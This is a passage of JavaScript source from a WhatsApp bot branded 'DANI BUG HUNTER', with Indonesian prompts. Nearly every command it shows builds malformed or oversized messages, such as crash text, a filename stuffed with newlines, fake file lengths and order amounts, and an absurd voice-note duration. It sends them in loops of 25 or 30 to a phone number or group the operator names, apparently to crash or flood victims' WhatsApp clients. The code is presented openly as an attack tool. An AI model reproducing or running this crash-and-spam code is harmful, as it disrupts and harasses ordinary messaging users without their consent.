mimetype: 'audio/mpeg', 
caption: `© DANI BUG HUNTER ${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: pp_bot, 
thumbnail: pp_bot,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'sendbuglokasi':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": `© DANI BUG HUNTER ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `© DANI BUG HUNTER ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: num, quoted: lep })
Dani.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'sendvirtex':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Dani.relayMessage(num, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `© DANI BUG HUNTER ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: pp_bot }}}}, {quoted:lep})
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'sendbugvn':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Dani.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'sendbugkontak':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Dani.sendContact(num, owner, lep)
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'sendbugdocument':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Dani.sendMessage(num, { 
document: pp_bot, 
fileName: `🔥 DANI MODS☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: pp_bot, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'sendbugsticker':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Dani.sendMessage(num, {sticker: pp_bot},{ quoted: lep })
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'sendbugitem': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `© DANI BUG HUNTER ${virus}${virtex(prefix)}`, `© DANI BUG HUNTER ${virus}${virtex(prefix)}`, `© DANI BUG HUNTER ${virus}${virtex(prefix)}`, pp_bot, "6285714627920@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'sendbugcatalog': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `© DANI BUG HUNTER ${virus} ${virtex(prefix)}`,
"description": `${virus}${virtex(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6285714627920`
},
"businessOwnerJid": "6285714627920@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
Dani.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'buglokasi': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© DANI MODS ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
Dani.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'bugstiker':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `© DANI BUG HUNTER`
for (let i = 0; i < jumlah; i++) {
Dani.sendMessage(m.chat, {sticker: pp_bot },{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `© DANI BUG HUNTER ${ngazap(prefix)}`,
"jpegThumbnail": fs.readFileSync('./media/image/bug.jpg'),
}
}
}})
}
m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugkontak': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© DANI MODS ${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Dani\nitem1.TEL;waid=62857-1462-7920:+62 857-1462-7920\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer HW MODS WAWhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
Dani.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
case 'buginvite': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `© DANI MODS ${ngazap(prefix)}`,
"groupName": `© DANI MODS ${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
Dani.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
case 'bugtroli': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© DANI MODS ${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./media/image/bug.jpg'),
"orderTitle": `© DANI MODS ${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
Dani.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'bugaudio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
Dani.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'bugimage': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© DANI MODS ${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
Dani.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
case 'bugdocument': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© DANI MODS ${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
Dani.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'santedpcparah': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Contoh ${command} 6281297970769`)
nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let hdhe = await Dani.onWhatsApp(nmn)
if (hdhe.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
santedpc(bygbt, nmn, sleep)
break
case 'santedgcparah': 
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let fhehfhe = args[0].split('https://chat.whatsapp.com/')[1]
let mnm = await Dani.groupAcceptInvite(fhehfhe)
santedgc(bygbt, mnm, sleep)
break
case 'santetpc':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Contoh ${command} 6281297970769`)
tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let kgdhwus = await Dani.onWhatsApp(tosend)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
Dani.sendMessage(tosend, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Sukses`)
break
case 'santetgc':
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let resultny = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await Dani.groupAcceptInvite(resultny)
Dani.sendMessage(tosendgc, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Sukses`)
break
case 'spambugvip':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|jumlah\nContoh ${prefix+command} 628362663622|5`)
numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let cekno = await Dani.onWhatsApp(numt)
if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
if (isNaN(jumlah)) return reply(`Harus berupa angka`)
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6285807264974@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: Dani.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-Dani ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
